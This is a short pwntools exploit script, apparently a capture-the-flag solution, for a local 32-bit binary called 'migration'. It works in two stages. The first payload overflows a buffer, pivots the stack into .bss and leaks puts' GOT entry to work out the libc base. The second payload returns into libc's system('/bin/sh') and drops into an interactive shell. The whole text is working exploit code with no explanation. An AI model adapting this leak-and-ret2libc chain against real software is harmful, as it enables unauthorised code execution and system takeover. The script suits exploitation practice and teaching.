from pwn import *

context.arch = "i386"
# context.log_level = "DEBUG"

p = process("./migration")
e = ELF("./migration")

libc = ELF("../libc.so.6")

# attach(p, "b *0x08048505\nb *0x080484e5\nb *0x80484fa\nb *0x08048502\nc")

main = 0x080484e5

payload = ""

payload += "A"*40
payload += p32(e.bss()+0x924)

payload += p32(e.plt["puts"])
payload += p32(main)
payload += p32(e.got["puts"])

p.sendlineafter(":", payload)

p.recv()

puts_got = u32(p.recv(4))
print("[*] puts_got is " + hex(puts_got))

libc.address = libc.address + puts_got - libc.symbols["puts"]

payload2 = ""

payload2 += "A"*40
payload2 += p32(e.bss()+0x900)

payload2 += p32(libc.symbols["system"])
payload2 += p32(libc.symbols["exit"])
payload2 += p32(next(libc.search("/bin/sh")))

p.sendlineafter(":", payload2)

p.interactive()